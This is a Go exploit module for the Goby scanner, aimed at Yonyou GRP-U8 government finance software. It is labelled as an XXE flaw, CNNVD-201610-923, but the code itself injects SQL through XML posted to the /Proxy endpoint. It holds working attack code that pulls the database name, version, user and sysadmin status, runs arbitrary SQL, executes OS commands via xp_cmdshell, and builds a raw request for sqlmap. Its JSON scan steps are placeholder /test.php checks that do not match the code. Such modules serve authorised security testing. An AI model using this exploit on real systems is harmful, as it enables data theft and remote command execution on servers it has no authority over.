package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "yonyou GRP-U8 /Proxy XML External Entity Injection Vulnerability(CNNVD-201610-923)",
    "Description": "<p> </p><p>Yonyou GRP-U8 administrative financial management software is a new generation of products launched by Yonyou focusing on national e-government undertakings and based on cloud computing technology, and is the most professional government financial management software in the field of administrative finance in China.</p><p>Yonyou GRP-u8 was exposed to the XXE vulnerability, which stems from the fact that the application does not restrict the loading of external entities when parsing XML input, resulting in the loading of malicious external files, SQL statements, and even system commands.</p>",
    "Product": "yonyou-GRP-U8",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2016-10-06",
    "PostTime": "2024-07-18",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"GRP-U8\" && body=\"./scripts/cookie.js\"",
    "GobyQuery": "title=\"GRP-U8\" && body=\"./scripts/cookie.js\"",
    "Level": "2",
    "Impact": "<p>This vulnerability can load malicious external files, execute SQL statements, and even execute system commands.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
    "References": [
        "https://www.cnblogs.com/pursue-security/p/17684995.html",
        ""
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,cmd,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name,is_admin",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT 6666",
            "show": "attackType=custom"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "Command Execution",
        "XML External Entity Injection"
    ],
    "VulType": [
        "Command Execution",
        "SQL Injection",
        "XML External Entity Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        "CNNVD-201610-923"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "用友 GRP-U8 /Proxy XML 外部实体注入漏洞（CNNVD-201610-923）",
            "Product": "用友-GRP-U8",
            "Description": "<p>用友GRP-U8行政事业财务管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品，是我国行政事业财务领域最专业的政府财务管理软件。</p><p>用友GRP-u8被曝存在XXE漏洞，该漏洞源于应用程序解析XML输入时没有限制外部实体的加载，导致可加载恶意外部文件，可以执行SQL语句，甚至可以执行系统命令。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>该漏洞可加载恶意外部文件，可以执行SQL语句，甚至可以执行系统命令。<br><br></p>",
            "VulType": [
                "SQL注入",
                "命令执行",
                "XML外部实体注入"
            ],
            "Tags": [
                "SQL注入",
                "命令执行",
                "XML外部实体注入"
            ]
        },
        "EN": {
            "Name": "yonyou GRP-U8 /Proxy XML External Entity Injection Vulnerability(CNNVD-201610-923)",
            "Product": "yonyou-GRP-U8",
            "Description": "<p> </p><p>Yonyou GRP-U8 administrative financial management software is a new generation of products launched by Yonyou focusing on national e-government undertakings and based on cloud computing technology, and is the most professional government financial management software in the field of administrative finance in China.</p><p>Yonyou GRP-u8 was exposed to the XXE vulnerability, which stems from the fact that the application does not restrict the loading of external entities when parsing XML input, resulting in the loading of malicious external files, SQL statements, and even system commands.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>This vulnerability can load malicious external files, execute SQL statements, and even execute system commands.<br></p>",
            "VulType": [
                "Command Execution",
                "SQL Injection",
                "XML External Entity Injection"
            ],
            "Tags": [
                "SQL Injection",
                "Command Execution",
                "XML External Entity Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10972"
}`
	setSqlPayloadHashdjdqqdcnuuqeunqne283h2fnu2y3 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		vulurl = "/Proxy"
		makeRequest := httpclient.NewPostRequestConfig(vulurl)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 5
		makeRequest.FollowRedirect = true
		makeRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		//将sql中的双引号替换为单引号
		payload := `cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">` + sql + `</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>`
		makeRequest.Data = payload
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
			if resp.StatusCode == 200 {
				return resp, vulurl, err
			}
		}
		err = fmt.Errorf("fail")
		return resp, vulurl, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "SQL Server"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "select @@version"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `COLUMN1="([\s\S]*?)"`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashdjdqqdcnuuqeunqne283h2fnu2y3
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /Proxy HTTP/1.1\r\nHost: " + expResult.HostInfo.HostInfo + "\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.1)\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 348\r\n\r\ncVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format=\"text\">SELECT DB_NAME()</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>"

			// 3.配置正则语句，从响应包中提取出数据
			regular := `COLUMN1="([\s\S]*?)"`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
        matches := reRequest.FindAllStringSubmatch(RegularContent, -1)
        result :=""
        for _, match := range matches {
            // match[1] 包含每个匹配的捕获组
            result+=match[1]+"\r\n"
        }
				return result, nil
			}
			sendPayload := setSqlPayloadHashdjdqqdcnuuqeunqne283h2fnu2y3
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" || attacktype == "custom" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "SELECT DB_NAME()"
					} else if way == "db_version" {
						sql = "SELECT @@version"
					} else if way == "user_name" {
						sql = "SELECT user"
					} else if way == "is_admin" {
						sql = "SELECT IS_SRVROLEMEMBER('sysadmin')"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "cmd" {
				cmd := "exec xp_cmdshell\""+goutils.B2S(ss.Params["cmd"])+"\""
				resp, _, err := sendPayload(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, `output="([\s\S]*?)"`)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
        expResult.Success = true
        expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
